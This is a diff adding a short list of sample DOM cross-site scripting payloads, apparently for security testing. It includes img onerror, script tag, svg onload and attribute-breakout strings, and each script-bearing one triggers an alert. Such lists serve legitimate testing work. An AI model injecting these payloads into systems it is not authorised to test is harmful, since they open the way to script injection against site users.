@@ -1,0 +1,19 @@
+SAMPLE PAYLOADS FOR DOM XSS
+
+Basic payload:
+<img src=x onerror=alert('DOM XSS')>
+
+Simple HTML:
+<b>Injected DOM Content</b>
+
+Script tag test:
+<script>alert('DOM XSS')</script>
+
+SVG event:
+<svg onload=alert('DOM XSS')></svg>
+
+Breakout style test:
+"><img src=x onerror=alert('DOM XSS')>
+
+Note:
+Some payloads may behave differently depending on browser behavior and the DOM sink used.
